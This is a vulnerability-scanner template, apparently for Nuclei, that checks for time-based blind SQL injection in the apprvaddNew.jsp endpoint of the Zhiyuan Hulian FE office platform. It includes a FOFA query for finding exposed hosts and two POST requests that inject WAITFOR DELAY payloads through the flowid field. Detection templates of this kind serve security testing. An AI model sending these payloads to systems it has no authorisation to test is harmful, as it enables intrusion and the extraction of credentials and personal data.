id: zhiyuanhulianFE-apprvaddNew-sql

info:
  name: "致远互联 FE 协作办公平台 apprvaddNew.jsp SQL 时间盲注"
  author: Unknown
  severity: high
  description: |-
    fofa: body="li_plugins_download"
      致远互联FE协作办公平台在apprvaddNew.jsp接口中存在SQL时间盲注漏洞。攻击者可通过构造恶意SQL查询语句，利用数据库响应时间差异实现信息推理，从而提取敏感数据（如管理员凭证、用户个人信息）。在具备足够权限的情况下，该漏洞可能被链式利用实现远程代码执行或系统权限提升。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/141129832
  tags: 致远互联FE协作办公平台


http:
- raw:
  - |
    POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
    Host: {{Hostname}}
    Content-Type:application/x-www-form-urlencoded

    flowid=1';WAITFOR+DELAY+'0:0:4'--

  - |
    POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
    Host: {{Hostname}}
    Content-Type:application/x-www-form-urlencoded

    flowid=1';WAITFOR+DELAY+'0:0:8'--


  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and






